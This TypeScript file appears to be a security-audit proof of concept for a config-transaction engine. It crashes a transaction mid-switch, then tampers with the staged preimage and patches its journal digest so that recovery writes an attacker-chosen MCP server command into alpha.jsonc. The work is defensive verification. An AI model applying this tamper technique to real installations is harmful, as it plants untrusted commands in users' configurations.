// #1530 revised C2 plan — audit R1 finding 4: the ext-transaction recovery rollback writes an
// ATTACKER-controlled staged preimage back into alpha.jsonc, under production recovery params, with no
// receipt. This proves R3's journal branch is a real path (justifying C2-T as necessary), independent of
// the ledger (installs.json) branch.
//
// Threat model: every byte under <G>/ext-tx (journal + staging) is in the fence's writable set W2, so the
// fenced engine tree can author it. This probe does NOT forge the journal schema by hand — it drives the
// REAL production transaction engine to a mid-switch crash (a valid, schema-correct journal + staging), then
// performs ONLY the two writes an in-fence attacker can make: overwrite the chain-first staged `.pre` with
// attacker JSON and patch that item's `preDigest` to match. Recovery (production opts) then writes the
// attacker preimage into alpha.jsonc.
//
// Run from the worktree root: bun docs/verification/2026-10-15-req234-c2-fence-preverify/journal-rollback-probe.ts
import assert from "node:assert/strict"
import * as crypto from "node:crypto"
import { mkdtempSync, readFileSync, writeFileSync, rmSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { runExtensionTransaction, recoverExtensionTransactions, readTransactionJournal, type TxPlan } from "../../../packages/ui-mac/src/main/ext-transaction"

const sha = (s: string) => crypto.createHash("sha256").update(s, "utf8").digest("hex")
const root = mkdtempSync(join(tmpdir(), "ac1530-journal-"))
const cfg = join(root, "alpha.jsonc")
const BENIGN = JSON.stringify({ $schema: "https://opencode.ai/config.json" }, null, 2)
const ATTACKER = JSON.stringify({ $schema: "https://opencode.ai/config.json", mcp: { evil: { type: "local", command: ["attacker"] } } }, null, 2)

try {
  writeFileSync(cfg, BENIGN)
  // Production transaction: two config edits on alpha.jsonc, crashed mid-switch (item_0 applied, item_1 not).
  const plan: TxPlan = {
    items: [
      { key: "mcp--a", action: "config", config: { target: cfg, edits: [{ keyPath: ["mcp", "a"], value: { type: "local", command: ["trusted"] } }] }, manifestDigest: "sha256:a" },
      { key: "mcp--b", action: "config", config: { target: cfg, edits: [{ keyPath: ["mcp", "b"], value: { type: "local", command: ["trusted2"] } }] }, manifestDigest: "sha256:b" },
    ],
  }
  let crashed = false
  try {
    await runExtensionTransaction(root, plan, { populate: () => {}, commitReceipt: () => {}, log: () => {}, crashAt: "mid-switch" as never })
  } catch {
    crashed = true
  }
  assert.equal(crashed, true, "expected the mid-switch crash to leave a non-terminal journal")
  const live0 = readFileSync(cfg, "utf8")
  assert.ok(live0.includes('"a"') && !live0.includes('"b"'), "mid-switch live should have item_a applied, item_b not")

  // Locate the crashed tx.
  const txDir = join(root, "ext-tx")
  const journalDir = join(txDir, "journal")
  const { readdirSync } = await import("node:fs")
  const jname = readdirSync(journalDir).find((n) => n.endsWith(".json"))!
  const txId = jname.replace(/\.json$/, "")
  const jpath = join(journalDir, jname)
  const journal = JSON.parse(readFileSync(jpath, "utf8"))

  // ── The two in-fence (W2) writes an attacker makes ──────────────────────────────────────────────
  // 1) overwrite the chain-first staged preimage with attacker bytes
  const stagePre0 = join(txDir, "staging", txId, "config-0.pre")
  writeFileSync(stagePre0, ATTACKER)
  // 2) patch that item's preDigest so readStagedConfigImage accepts the tampered preimage; leave nextDigest
  //    untouched so restoreConfigImage's `curDigest === nextDigest` gate (live == item_0.nextDigest) holds.
  journal.items[0].config.preDigest = sha(ATTACKER)
  writeFileSync(jpath, JSON.stringify(journal, null, 2))

  // Production recovery parameters (ext-ipc.ts recoveryOpts: no probe, pidAlive crash-safe, commitReceipt).
  const rec = await recoverExtensionTransactions(root, { commitReceipt: () => {}, pidAlive: () => false, log: () => {} })
  const after = readFileSync(cfg, "utf8")
  const state = readTransactionJournal(root, txId)?.state
  const landed = after === ATTACKER

  console.log(JSON.stringify({ recoveryOk: rec.ok, reportAction: rec.reports[0]?.action, journalState: state, attackerLanded: landed }, null, 2))
  console.log(landed ? "RESULT: ATTACK CONFIRMED — recovery wrote attacker preimage into alpha.jsonc" : "RESULT: attack did not land (recovery refused the tampered preimage)")
  assert.equal(landed, true, "expected recovery to write the attacker preimage into alpha.jsonc")
  assert.ok(after.includes('"attacker"'), "alpha.jsonc should now carry the attacker MCP command")
  process.exitCode = 0
} finally {
  rmSync(root, { recursive: true, force: true })
}
